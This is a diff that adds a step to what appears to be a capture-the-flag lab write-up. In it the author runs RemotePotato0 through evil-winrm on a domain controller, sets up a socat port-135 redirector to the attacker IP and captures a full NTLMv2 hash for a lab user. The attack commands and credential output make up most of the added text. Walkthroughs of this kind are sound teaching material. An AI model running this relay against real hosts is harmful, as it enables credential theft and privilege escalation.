@@ -616,8 +616,34 @@ evil-winrm-py PS C:\Temp> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.61 -p 9001
 Ill then run this on the target using the remote potato binary and set the port i chose and my IP address
 
 ```python
+evil-winrm-py PS C:\Temp> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.61 -p 9001
+[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9001
+[*] Example Network redirector: 
+	sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9001
+[*] Starting the RPC server to capture the credentials hash from the user authentication!!
+[*] RPC relay server listening on port 9997 ...
+[*] Spawning COM object in the session: 1
+[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
+[*] Starting RogueOxidResolver RPC Server listening on port 9001 ... 
+[*] IStoragetrigger written: 104 bytes
+[*] ServerAlive2 RPC Call
+[*] ResolveOxid2 RPC call
+[+] Received the relayed authentication on the RPC relay server on port 9997
+[*] Connected to RPC Server 127.0.0.1 on port 9001
+[+] User hash stolen!
 
+NTLMv2 Client	: DC01
+NTLMv2 Username	: MIRAGE\mark.bbond
+NTLMv2 Hash	: mark.bbond::MIRAGE:e5e9025a2dc59132:51781a6c2c43dfd18c5e02823139aa87:0101000000000000c87cf4b3a65add0101240c15d04d81cc0000000002000c004d0049005200410047004500010008004400430030003100040014006d00690072006100670065002e0068007400620003001e0064006300300031002e006d00690072006100670065002e00680074006200050014006d00690072006100670065002e0068007400620007000800c87cf4b3a65add010600040006000000080030003000000000000000010000000020000061ff03ee6bcccb4f55a747e7d85db6de047a3e0276997935f88b88ce38a4498f0a00100000000000000000000000000000000000090000000000000000000000
+
+evil-winrm-py PS C:\Temp>
 ```
+
+Then a few seconds later i get a hash for the user `mark.bbond`
+
+
+
+
 
 
 
